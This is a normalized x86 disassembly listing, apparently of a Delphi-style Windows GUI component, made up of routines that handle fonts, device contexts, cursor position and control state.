mov [ eax + 0x230 ] 0x1
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov edx ebx
call sub_437cf0
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403518
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x28 ]
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403518
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov esi [ ebx + 0x14 ]
test [ esi ] 0x1
je r-xdata
sub eax 0x97
je r-xdata
lea eax [ ebp - 0x5c ]
xor ecx ecx
mov edx 0x28
call sub_402d00
mov eax [ ebx + 0x24 ]
mov [ ebp - 0x58 ] eax
test [ ebx + 0xc ] 0x10002
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cf0
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403518
jmp r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb0
call sub_403518
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
mov eax [ eax + 0x18 ]
cmp eax [ esi + 0x4 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x35a ] 0x0
je r-xdata
sub eax 0x5
je r-xdata
mov eax [ ebx + 0xc ]
test eax 0x10001
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
call sub_403b7c
jmp r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
jne r-xdata
xor eax eax
push ebp
push sub_43a0b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425b4c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425a08
lea edx [ ebp - 0x34 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
retn
mov cl 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_437cf0
mov edi eax
mov ecx [ ebx + 0x1c ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403518
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x36a ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax esi
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
mov eax [ eax + 0x14 ]
cmp eax [ esi + 0x4 ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
mov eax [ eax + 0x18 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
pop edx
call sub_436dec
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4599c4
lea edx [ ebp - 0xa4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46f398
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ebx esi
mov eax [ ebx + 0x10 ]
call sub_439ddc
mov [ ebp - 0xa ] al
xor esi esi
lea eax [ ebp - 0x10 ]
call sub_404118
lea ecx [ ebp - 0x18 ]
xor edx edx
xor eax eax
call sub_4062cc
mov [ ebp - 0x19 ] 0x4
mov al [ ebp - 0xa ]
sub al 0x1
jb r-xdata
sub eax 0x2
je r-xdata
test eax 0x10002
je r-xdata
xor edx edx
push ebp
push sub_43a463
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425b4c
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259ec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x170 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_425a08
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov edx [ eax + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edx + 0xc ] ecx
mov [ edx + 0x8 ] sub_43bbe4
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov [ eax + 0x8 ] sub_43bbe4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
cmp [ ebp - 0x1a ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x20
mov cl 0x2
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259c4
retn
lea edx [ ebp - 0x34 ]
mov cl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x2
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
dec eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x1c ] 0x8
jne r-xdata
cmp [ eax + 0x10 ] 0xffffffff
je r-xdata
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
mov eax [ eax + 0x14 ]
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43b38c
pop edx
call sub_436dec
jmp r-xdata
mov esi [ ebx + 0x18 ]
jmp r-xdata
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edi eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
lea ebx [ eax + 0xc ]
test [ ebx ] 0x1
je r-xdata
jmp r-xdata
test eax 0x10003
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x0
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x104 ]
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x29c ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
call DeleteObject
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x298 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x29c ] edx
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
lea edx [ ebp - 0x34 ]
mov cl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov cl 0x3
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebx + 0x18 ] 0x2
je r-xdata
lea edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403518
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
mov eax [ ebx + 0xc ]
push eax
mov al [ ebp - 0x19 ]
push eax
test [ ebx + 0x10 ] 0x20
setne al
push eax
mov eax [ ebx + 0x10 ]
call sub_439ddc
mov edx eax
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x118 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov edi [ ebx + 0x14 ]
test edi edi
je r-xdata
je r-xdata
test [ ebx ] 0x2
je r-xdata
mov esi [ ebx + 0x8 ]
test esi esi
jne r-xdata
test eax 0x10004
je r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x1
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403b7c
call sub_403b7c
jmp r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
lea edx [ ebp - 0x34 ]
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x100 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
test [ ebx + 0x18 ] 0x2
jne r-xdata
test [ ebx + 0x14 ] 0x2
jne r-xdata
lea eax [ ebp - 0x10 ]
call sub_404118
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_408d90
jmp r-xdata
mov eax [ ebx + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebx + 0x24 ]
sub eax 0x25
je r-xdata
jmp r-xdata
test [ ebx ] 0x10
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jg r-xdata
mov ecx [ ebx + 0x18 ]
dec ecx
mov edx [ edi + 0x24 ]
mov eax [ ebx + 0x14 ]
call sub_408c60
jmp r-xdata
cmp [ ebp - 0x1a ] 0x0
je r-xdata
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
jmp r-xdata
mov ax [ ebx + 0x28 ]
push eax
push 0x2
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a46a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
call sub_424640
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_424b14
push eax
call GetObjectA
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
test [ ebx + 0x14 ] 0x2
je r-xdata
push 0x0
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
jmp r-xdata
mov [ ebp - 0x19 ] 0x0
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x14 ]
mov [ ebx + 0x24 ] eax
jmp r-xdata
mov esi [ ebx + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43b418
mov eax [ edi + 0x10 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ eax ] 0x0
lea ecx [ ebp - 0x9c ]
mov edx [ ebx + 0x8 ]
dec edx
mov eax [ ebp - 0x24 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov edx [ ebp - 0x9c ]
mov ecx [ ebx + 0x18 ]
dec ecx
mov eax [ ebx + 0x14 ]
call sub_408c60
jmp r-xdata
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov cx [ ebx + 0x28 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x104 ]
mov ax [ ebx + 0x28 ]
push eax
push 0x3
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x108 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
push 0x1
mov ebx [ ebp - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x36c ]
call [ ebx + 0x368 ]
mov [ ebp - 0x19 ] 0x2
jmp r-xdata
dec eax
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax [ edi + 0x20 ]
inc eax
call sub_42a958
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0xf000
or [ ebx ] 0x8
jmp r-xdata
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
dec eax
je r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov eax edi
call sub_437b84
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push eax
mov ecx [ ebx + 0x8 ]
dec ecx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43beac
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x1c ] eax
mov [ ebp - 0x19 ] 0x3
jmp r-xdata
sub_43a310
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_439c94
mov edx eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x108 ]
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28a ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x4
call sub_403b7c
call sub_403b7c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a46a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28a ] 0x0
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x210 ]
mov eax [ esi + 0xc ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov eax [ esi + 0x14 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] edx
mov edi [ ebp - 0x8 ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0xc ]
mov eax [ eax + 0x18 ]
call sub_424640
mov [ edi + 0x30 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0x14 ]
call sub_4252c4
call sub_424640
mov [ edi + 0x34 ] eax
lea eax [ ebp - 0x98 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
mov eax [ eax + 0xc ]
call sub_424b14
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ab05
lea eax [ ebp - 0x9c ]
call sub_404118
lea eax [ ebp - 0x10 ]
call sub_404118
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
xor edx edx
call sub_425b4c
lea eax [ ebp - 0x98 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x298 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x29c ] eax
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x2
sub_43a46a
cmp [ ebp - 0x1a ] 0x0
jne r-xdata
mov cl 0x1
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
xor ecx ecx
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov cl 0x3
mov dl 0x2
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov cl 0x1
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x210 ]
call sub_4259c4
retn
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
mov cl 0x3
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x124 ]
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x10
mov eax [ ebp - 0x8 ]
or [ eax + 0xc ] 0x40
jmp r-xdata
sub_43ab0c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
test [ ebx + 0x98 ] 0x4
je r-xdata
mov ecx [ esp ]
mov edx ebp
mov eax ebx
call sub_454bc0
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x23c ]
call sub_419a38
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov eax [ esp ]
push eax
push ebp
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_436f90
call sub_436db8
push eax
call MulDiv
push eax
mov edx esi
mov eax [ ebx + 0x23c ]
call sub_436f90
pop edx
call sub_436dec
inc esi
dec edi
jne r-xdata
sub_43aba0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_43abf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4045c8
xor eax eax
push ebp
push sub_43ac49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x22c ]
call sub_437c64
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_437704
mov edx esi
mov eax ebx
call sub_4377b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ac50
lea eax [ ebp - 0x4 ]
call sub_404118
retn
sub_43ac58
push ebx
push ecx
mov [ esp ] 0x1
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2ca ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
mov cl 0x2
jmp r-xdata
sub_43aca0
push ebx
dec ecx
je r-xdata
xor ecx ecx
jmp r-xdata
dec ecx
je r-xdata
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov cl 0x1
jmp r-xdata
sub ecx 0x6
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov cl 0x2
jmp r-xdata
sub_43acd8
push ebx
push esi
mov ebx edx
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x29 ] 0x0
jne r-xdata
cmp [ eax + 0x32a ] 0x0
je r-xdata
mov [ ebx + 0x29 ] 0x1
mov eax ebx
call sub_437620
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x32c ]
call [ esi + 0x328 ]
sub_43ad10
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x342 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x344 ]
call [ ebx + 0x340 ]
sub_43ad3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43adad
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x14 ]
call sub_404310
mov edx esi
mov eax ebx
call sub_439c94
mov esi eax
cmp [ ebx + 0x33a ] 0x0
je r-xdata
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x33c ]
call [ ebx + 0x338 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43adb4
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_437704
sub_43adbc
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf0 ]
dec eax
jne r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x224 ]
pop ebx
retn
sub_43add8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ esi ]
cmp eax 0xf
je r-xdata
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp eax 0x14
jne r-xdata
mov eax ebx
call sub_44f03c
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_452ac8
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_452a34
test al al
jne r-xdata
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_43ae56
add [ eax ] al
push ebx
push esi
add esp 0xffffffd8
mov ebx eax
mov eax ebx
call sub_44f0b0
xor eax eax
mov [ ebx + 0x270 ] eax
push esp
call GetCursorPos
lea ecx [ esp + 0x20 ]
mov edx esp
mov eax ebx
call sub_44e3f8
mov eax [ esp + 0x20 ]
mov [ esp ] eax
mov eax [ esp + 0x24 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x26c ]
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov edx eax
mov eax [ ebx + 0x22c ]
call sub_437cf0
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebx
call sub_43b574
mov esi eax
mov [ ebx + 0x26c ] 0xffffffff
test esi esi
jne r-xdata
add esp 0x28
pop esi
pop ebx
retn
mov eax esi
call sub_437b38
push eax
mov eax ebx
call sub_4550b4
lea ecx [ esp + 0xc ]
pop edx
call sub_42ab18
test eax eax
je r-xdata
mov ebx [ ebx + 0x224 ]
mov edx eax
mov eax ebx
call sub_45bc04
lea ecx [ esp + 0x10 ]
xor edx edx
mov eax esi
call sub_437b54
mov eax [ esp + 0x4 ]
sub eax [ esp + 0x14 ]
push eax
mov ecx [ esp + 0x4 ]
sub ecx [ esp + 0x14 ]
xor edx edx
mov eax ebx
call sub_456b4c
sub_43af2c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44f0d0
mov eax [ ebx + 0x224 ]
call sub_456d34
xor eax eax
mov [ ebx + 0x270 ] eax
pop ebx
pop ebp
retn 0x4
sub_43af58
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45476c
mov edi [ esi + 0x8 ]
mov al [ esi + 0x4 ]
dec al
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x18 ]
mov eax ebx
call sub_43b3b0
mov [ ebx + 0x270 ] eax
xor edx edx
mov eax ebx
call sub_43b3d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ edi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
jmp r-xdata
dec al
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov ecx esp
mov edx edi
mov eax ebx
call sub_44e3f8
mov eax [ esp + 0x4 ]
push eax
cmp [ esi + 0xc ] 0x0
setne al
push eax
mov edx [ edi + 0x8 ]
mov ecx [ esp + 0x8 ]
mov eax ebx
call sub_43b08c
jmp r-xdata
dec al
je r-xdata
xor eax eax
mov [ ebx + 0x270 ] eax
